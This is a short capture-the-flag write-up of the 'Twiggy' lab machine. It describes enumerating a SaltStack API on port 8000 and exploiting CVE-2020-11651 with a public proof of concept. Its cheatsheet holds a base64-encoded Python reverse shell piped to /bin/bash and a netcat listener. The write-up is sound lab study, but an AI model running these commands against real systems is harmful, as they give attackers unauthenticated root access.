# Twiggy \[Easy]

## Report

Mezzanine CMS hosted on port 80 shows no real vulnerabilities on looking around. However, port 8000 turns out to be an API call and the API used is leaked in response headers (saltapi). An unauthenticated RCE exploit is available and we obtain a reverse shell as root.

## Cheatsheet

```
curl -I http://192.168.61.62:8000
https://github.com/jasperla/CVE-2020-11651-poc
sudo tcpdump icmp
python3 exploit.py --master 192.168.61.62 --exec "ping 192.168.49.61"
python3 exploit.py --master 192.168.61.62 --exec 'echo "cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC40OS42MSIsODAwMCkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIikn" | base64 -d | /bin/bash'
nc -lvnp 8000
```

## Loot

### Enumeration

#### Ports Open

* 22 - SSH
* 80 - Mezzanine CMS - Powered by django (Python running)
* 8000 - saltapi version 3000.1

### Attack Vectors

Information disclosure of saltapi via HTTP headers in request made to port 8000

### PrivEsc

None - we get reverse shell as root from saltapi RCE exploit

### Creds

None

### Proof

`'echo "revshell payload" | base64 -d | /bin/bash'`

The other way for quotes didn't quite work out, python payload as we know django instance is running on port 80
